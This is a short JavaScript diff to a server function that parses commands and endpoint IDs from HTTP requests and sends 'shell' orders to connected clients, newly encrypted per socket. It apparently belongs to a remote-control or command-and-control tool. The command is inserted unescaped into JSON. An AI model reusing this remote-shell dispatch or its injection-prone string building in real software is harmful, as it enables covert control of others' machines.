@@ -1,5 +1,6 @@
 function httpRes(socket, sockets, getdata, privateKey){
 	//parsing command and enpoints
+	const ciph = require('./crypto/crypto');
 	var parsing = getdata[1].split("_._/")
 	var cmdp = parsing[0].split("/command=")[1].split("%20")
 	var endp = parsing[1].split("endp=")[1].split(",")
@@ -9,10 +10,14 @@ function httpRes(socket, sockets, getdata, privateKey){
 	});
 	command = String(command)
 	endp.forEach( endpo =>{
-		sockets.forEach( sock =>{
+		sockets.forEach( async sock =>{
 			if (endpo === sock["id"].replace(/['"]+/g, '')){
 				//sock.write(ciph.decrypt(`{"order": "shell", "command": "${command}"}`, privateKey))
-				sock.write(`{"order": "shell", "command": "${command}"}`)
+				theQuery = `{"order": "shell", "command": "${command}"}`
+				console.log("Query que va a ser encriptada: ", theQuery)
+				let encrypted = await ciph.symEncrpyt(sock["sym"], theQuery)
+				console.log(encrypted)
+				await sock.write(encrypted)
 			};
 		});
 	});
